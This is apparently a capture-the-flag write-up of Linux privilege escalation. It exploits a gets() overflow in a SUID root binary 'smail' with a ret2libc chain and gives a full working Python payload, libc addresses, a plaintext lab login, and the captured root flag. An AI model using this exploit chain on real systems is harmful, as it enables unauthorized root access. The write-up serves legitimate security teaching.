### Priv Esc

**prerequisites - login as user carlJ using `carlJ:Pas$w0RD59247` on machine.**

**Alright so after logging in as carlJ there is a `mailing` directory in home and inside it a single binary called `smail`. Let's look at it before touching anything.**

```
carlJ@incognito:~/mailing$ ls -ali
total 20
    97 drwx------ 2 carlJ carlJ 4096 Apr 16  2021 .
295106 drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 ..
  2292 -rwsrwxr-x 1 root  root  8544 Apr  3  2021 smail
```

**Look at the perms `-rwsrwxr-x` and owner `root`. That little `s` is the SUID bit, means when we run it, it runs as root no matter who we are. So if we can hijack this thing we get a root shell. This is the whole game now.**

**First let's see what kind of binary it is and what it links against.**

```
carlJ@incognito:~/mailing$ ldd smail
        linux-vdso.so.1 (0x00007ffff7ffa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
```

**So it's a 64-bit dynamically linked binary pulling in libc. Important note here - this is NOT windows. In gatekeeper we had EIP, jmp esp and we threw windows shellcode on the stack. Here none of that applies. Different registers (RIP/RSP/RBP instead of EIP/ESP/EBP), and more importantly the stack is usually non-executable on linux so we CAN'T just drop shellcode and jump to it. Instead we do ret2libc - reuse code that already exists in libc, mainly the `system()` function and the string `/bin/sh` that's already sitting inside libc.**

**Before building anything let's check the mitigations. This tells us how hard/easy this is gonna be.**

```
carlJ@incognito:~/mailing$ cat /proc/sys/kernel/randomize_va_space
0
carlJ@incognito:~/mailing$ readelf -Ws smail | grep __stack_chk_fail
carlJ@incognito:~/mailing$ readelf -W -l smail | grep GNU_STACK
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
carlJ@incognito:~/mailing$ readelf -h smail | grep Type
  Type:                              EXEC (Executable file)
```

**This is basically the best case scenario for us:**
- `randomize_va_space = 0` -> **ASLR is OFF**. libc loads at the same address every single time so we can hardcode addresses. No leak needed.
- `__stack_chk_fail` returns nothing -> **no stack canary**. We can smash the return address without tripping any check.
- `GNU_STACK ... RW` -> stack is non executable (NX on), confirms we go the ret2libc route.
- `Type: EXEC` -> **not PIE**, so the binary base is fixed too.

**Now let's find the actual bug. Running it, it's a little mail menu:**

```
carlJ@incognito:~/mailing$ ./smail
What do you wanna do
1-Send Message
2-Change your Signature
2
Write your signature...
asdfasdfasdf
Changed
```

**Option 1 (send message) uses fgets with a size so that one is bounded/safe. Option 2 (change signature) is where the vuln is. Let's disassemble the function it calls, `sig()`.**

```
carlJ@incognito:~/mailing$ objdump -d smail | sed -n '/<sig>:/,/^$/p'
00000000004006b7 <sig>:
  4006b7:       55                      push   %rbp
  4006b8:       48 89 e5                mov    %rsp,%rbp
  4006bb:       48 83 ec 40             sub    $0x40,%rsp
  4006bf:       48 8d 45 c0             lea    -0x40(%rbp),%rax
  4006c3:       48 89 c7                mov    %rax,%rdi
  4006c6:       b8 00 00 00 00          mov    $0x0,%eax
  4006cb:       e8 d0 fe ff ff          callq  4005a0 <gets@plt>
  4006d0:       48 8d 3d 41 01 00 00    lea    0x141(%rip),%rdi
  4006d7:       e8 94 fe ff ff          callq  400570 <puts@plt>
  4006dc:       90                      nop
  4006dd:       c9                      leaveq
  4006de:       c3                      retq
```

**There it is - `callq gets`. `gets()` reads input with ZERO bounds checking, it just keeps writing until it hits a newline. The buffer it writes into is at `-0x40(%rbp)` i.e. `rbp-0x40`. So we have a 64 byte buffer and we can write as much as we want past it. Classic overflow.**

**Now the offset. Don't trust the buffer size alone, calculate it from the frame. Buffer is at `rbp-0x40` (64 bytes to reach saved RBP), then 8 bytes of saved RBP, then the return address. So `0x40 + 8 = 72` bytes to reach RIP. Let's prove it instead of assuming - throw 72 A's and 8 B's at it under gdb.**

```
carlJ@incognito:~/mailing$ python3 -c 'import sys; sys.stdout.buffer.write(b"2\n"+b"A"*72+b"BBBBBBBB\n")' > /tmp/t
carlJ@incognito:~/mailing$ gdb -q -batch -ex 'run < /tmp/t' -ex 'i r rip rbp' ./smail
Program received signal SIGSEGV, Segmentation fault.
0x00000000004006de in sig ()
rip            0x4006de   0x4006de <sig+39>
rbp            0x4141414141414141   0x4141414141414141
```

**RBP is full of our A's and the crash is right on the `retq` trying to use our bytes as the return address. Offset 72 confirmed. (The reason it faults ON the ret and doesn't show `rip=0x4242...` is because 0x4242424242424242 is a non-canonical address, but that's just proof we own RIP.)**

<!-- img: gdb showing rbp = 0x4141... -->

**Now we build the ret2libc chain. On 64-bit, function arguments go in registers not the stack, and `system()` takes its argument in RDI. So we need to load RDI with a pointer to `/bin/sh`, then call system. To load RDI we borrow a gadget from libc - a tiny `pop rdi ; ret`. The chain looks like this:**

```
   [ 72 bytes of "A" ]   -> padding up to the saved return address
   [ pop rdi ; ret   ]   -> gadget, takes next stack value into RDI
   [ &"/bin/sh"      ]   -> gets popped into RDI
   [ ret             ]   -> extra ret, 16-byte stack alignment for system
   [ &system         ]   -> system("/bin/sh") -> root shell
```

**That extra bare `ret` is not decoration - modern glibc's `system` uses `movaps` which crashes if the stack isn't 16-byte aligned, one extra ret fixes the alignment.**

**Let's grab the 3 addresses we need. ASLR is off so libc base is `0x7ffff79e2000` (from ldd above) and everything is `base + offset`.**

**system() offset:**

```
carlJ@incognito:~/mailing$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' system@@'
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

**the /bin/sh string offset:**

```
carlJ@incognito:~/mailing$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
 1b3e1a /bin/sh
```

**and the `pop rdi ; ret` gadget (ROPgadget was on the box, nice):**

```
carlJ@incognito:~/mailing$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ': pop rdi ; ret'
0x00000000000215bf : pop rdi ; ret
```

**So putting it all together:**

| thing | offset | full addr (base 0x7ffff79e2000) |
|---|---|---|
| pop rdi ; ret | 0x215bf | 0x7ffff7a035bf |
| ret (align) | 0x215c0 | 0x7ffff7a035c0 |
| /bin/sh | 0x1b3e1a | 0x7ffff7b95e1a |
| system | 0x4f550 | 0x7ffff7a31550 |

**Quick sanity check in gdb that each address is actually what I think (run to main first so libc is mapped):**

```
   0x7ffff7a035bf <init_cacheinfo+239>: pop    %rdi
   0x7ffff7a035c0 <init_cacheinfo+240>: retq
   0x7ffff7a31550 <__libc_system>:      test   %rdi,%rdi
   0x7ffff7b95e1a:      "/bin/sh"
```

**All good. Now the ONE thing that made me lose my mind for a while - delivery.**

**The program reads the menu choice with scanf. When stdin is a pipe or a file, C's stdio grabs the WHOLE input in one big buffered read. So if I just pipe `payload + commands` into it, scanf slurps everything, and by the time our shell spawns there's nothing left in stdin for it - the shell gets instant EOF and dies. You can literally see it in strace, the spawned /bin/sh does `read(0,"")=0` and exits. The exploit was landing `system("/bin/sh")` perfectly the whole time, I just couldn't talk to the shell.**

**The fix is to keep stdin line-buffered by giving the shell a real terminal, and feed the commands AFTER the payload is already consumed. The clean way to do this in an interactive ssh session is to pipe the payload and then `cat` so your keyboard stays attached:**

```
(python3 -c '
import sys, struct
base  = 0x7ffff79e2000
p     = lambda x: struct.pack("<Q", x)
POP   = base + 0x215bf   # pop rdi ; ret
BINSH = base + 0x1b3e1a  # "/bin/sh"
RET   = base + 0x215c0   # ret (stack align)
SYS   = base + 0x4f550   # system
buf  = b"2\n"                        # menu -> option 2 (Change Signature)
buf += b"A"*72                       # padding to saved RIP
buf += p(POP) + p(BINSH) + p(RET) + p(SYS)
buf += b"\n"                         # end the gets() line
sys.stdout.buffer.write(buf)
'; cat) | ./smail
```

**Small but important - do NOT try to paste the raw payload into the "Write your signature" prompt by hand. The address bytes contain stuff like `0x00` and `0x1a` which the terminal eats / interprets as control chars (`0x1a` = Ctrl-Z). Python has to generate the bytes into the pipe, your keyboard can't type them.**

**After you run it the screen looks frozen but it's not - that's the root shell waiting. Just type your commands:**

```
(python3 -c ' ... ' ; cat) | ./smail
What do you wanna do
1-Send Message
2-Change your Signature
Write your signature...
Changed
id
uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
cat /root/root.txt
f21979de76c0302154cc001884143ab2
```

**`uid=0(root)`. We overflowed the signature buffer, overwrote the return address, chained `pop rdi -> "/bin/sh" -> system()` and since the binary is SUID it handed us a root shell. root.txt is ours.**
